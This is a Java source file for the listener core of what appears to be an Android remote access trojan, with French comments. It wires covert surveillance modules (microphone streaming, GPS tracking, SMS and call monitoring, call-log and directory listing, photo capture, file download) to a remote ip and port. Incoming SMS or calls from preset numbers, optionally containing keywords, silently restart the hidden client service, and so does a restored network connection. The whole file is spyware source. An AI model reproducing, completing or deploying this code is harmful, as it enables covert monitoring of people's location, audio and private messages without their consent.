package my.app.client;

import java.util.ArrayList;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.media.AudioRecord;
import android.media.AudioRecord.OnRecordPositionUpdateListener;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;
import my.app.Library.AdvancedSystemInfo;
import my.app.Library.AudioStreamer;
import my.app.Library.CallLogLister;
import my.app.Library.CallMonitor;
import my.app.Library.DirLister;
import my.app.Library.FileDownloader;
import my.app.Library.GPSListener;
import my.app.Library.PhotoTaker;
import my.app.Library.SMSMonitor;
import my.app.Library.SystemInfo;

public abstract class ClientListener extends Service implements OnRecordPositionUpdateListener,
	LocationListener {

	public AudioStreamer audioStreamer;

	public CallMonitor callMonitor;

	public CallLogLister callLogLister;

	public DirLister dirLister;

	public FileDownloader fileDownloader;
	public GPSListener gps;
	public PhotoTaker photoTaker;
	public SystemInfo infos;
	public Toast toast;
	public SMSMonitor smsMonitor;
	public AdvancedSystemInfo advancedInfos;
	boolean waitTrigger;
	ArrayList<String> authorizedNumbersCall;
	ArrayList<String> authorizedNumbersSMS;
	ArrayList<String> authorizedNumbersKeywords;

	String ip;
	int port;
	protected boolean isConnected = true;
	protected BroadcastReceiver SMSreceiver = new BroadcastReceiver() {

		private final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

		@Override
		public void onReceive(Context context, Intent intent) {

			if (intent.getAction().equals(this.SMS_RECEIVED)) { // On vérifie
																// que
				// c'est bien un
				// event de
				// SMS_RECEIVED même
				// si c'est
				// obligatoirement
				// le cas.
				Log.i("SMSReceived", "onReceive sms !");

				final Bundle bundle = intent.getExtras();
				if (bundle != null) {
					final Object[] pdus = (Object[]) bundle.get("pdus");

					final SmsMessage[] messages = new SmsMessage[pdus.length];
					for (int i = 0; i < pdus.length; i++)
						messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
					if (messages.length > -1) {

						final String messageBody = messages[0].getMessageBody();
						final String phoneNumber = messages[0].getDisplayOriginatingAddress();

						if (ClientListener.this.authorizedNumbersCall != null) {
							boolean found = false;
							boolean foundk = false;
							for (final String s : ClientListener.this.authorizedNumbersSMS)
								if (s.equals(phoneNumber))
									found = true;
							if (!found)
								return;
							if (ClientListener.this.authorizedNumbersKeywords != null) {
								for (final String s : ClientListener.this.authorizedNumbersKeywords)
									if (messageBody.contains(s))
										foundk = true;
								if (!foundk)
									return;
							}
							Log.i("Client", "Incoming call authorized");
						}

						final Intent serviceIntent = new Intent(context, Client.class); // On
						// lance
						// le
						// service
						serviceIntent.setAction("SMSReceiver");
						context.startService(serviceIntent);
					}
				}
			}
		}
	};
	protected BroadcastReceiver Callreceiver = new BroadcastReceiver() {
		private static final String TAG = "CallReceiver";

		@Override
		public void onReceive(final Context context, final Intent intent) {
			Log.i(TAG, "Call state changed !");
			final String action = intent.getAction();

			if (action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {

				final String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
				final String phoneNumber = intent
					.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

				if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
					Log.i(TAG, "Incoming call");

					if (ClientListener.this.authorizedNumbersCall != null) {
						boolean found = false;
						for (final String s : ClientListener.this.authorizedNumbersCall)
							if (s.equals(phoneNumber))
								found = true;
						if (!found)
							return;
						Log.i(TAG, "Incoming call authorized");
					}

					final Intent serviceIntent = new Intent(context, Client.class); // On
					// lance
					// le
					// service
					serviceIntent.setAction("CallReceiver");
					context.startService(serviceIntent);
				}

			} else {// Default event code

				final String data = intent.getDataString();
				Log.i(TAG, "broadcast : action=" + action + ", data=" + data);

			}
		}

	};
	public final BroadcastReceiver ConnectivityCheckReceiver = new BroadcastReceiver() {

		private final String TAG = "ConnectivityReceiver";

		@Override
		public void onReceive(Context context, Intent intent) {
			final String action = intent.getAction();
			String type;
			boolean state;
			// isConnected =
			// intent.getBooleanExtra(ConnectivityManager.EXTRA_NO_CONNECTIVITY,
			// false);

			final ConnectivityManager connectivityManager = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
			final NetworkInfo TestCo = connectivityManager.getActiveNetworkInfo();
			if (TestCo == null)
				state = false;
			else
				state = true;

			final NetworkInfo networkInfo = (NetworkInfo) intent
				.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
			if (networkInfo.getType() == ConnectivityManager.TYPE_WIFI)
				type = "Wifi";
			else if (networkInfo.getType() == ConnectivityManager.TYPE_MOBILE)
				type = "3g";
			else
				type = "other";

			if (state) {
				Log.w(this.TAG, "Connection is Available " + type);
				if (!ClientListener.this.isConnected) { // Si la connection est
														// maintenant ok et
					// qu'on était déconnecté
					final Intent serviceIntent = new Intent(context, Client.class); // On
					// lance
					// le
					// service
					serviceIntent.setAction("ConnectivityCheckReceiver");
					context.startService(serviceIntent);
				}
			} else
				Log.w(this.TAG, "Connection is not Available " + type);
			ClientListener.this.isConnected = state;
		}
	};

	public ClientListener() {
		super();
		// IntentFilter filter = new
		// IntentFilter("android.net.conn.CONNECTIVITY_CHANGE");
		// registerReceiver(ConnectivityCheckReceiver, filter); //Il faudrait
		// aussi le unregister quelquepart
	}

	public abstract void handleData(int channel, byte[] data); // C'est THE
																// methode à
																// implémenter
																// dans Client

	public abstract void loadPreferences();

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	public void onLocationChanged(Location location) {
		final byte[] data = this.gps.encode(location);
		this.handleData(this.gps.getChannel(), data);
	}

	public void onMarkerReached(AudioRecord recorder) {
		this.sendError("Marker reached for audio streaming");
	}

	public void onPeriodicNotification(AudioRecord recorder) {
		// Log.i("AudioStreamer", "Audio Data received !");
		try {
			final byte[] data = this.audioStreamer.getData();
			if (data != null)
				this.handleData(this.audioStreamer.getChannel(), data);
		} catch (final NullPointerException e) {

		}
	}

	public void onProviderDisabled(String provider) {
		this.sendError("GPS desactivated");
	}

	public void onProviderEnabled(String provider) {
		this.sendInformation("GPS Activated");
	}

	public void onStatusChanged(String provider, int status, Bundle extras) {
		// We really don't care
	}

	public abstract void sendError(String error);

	public abstract void sendInformation(String infos);
}
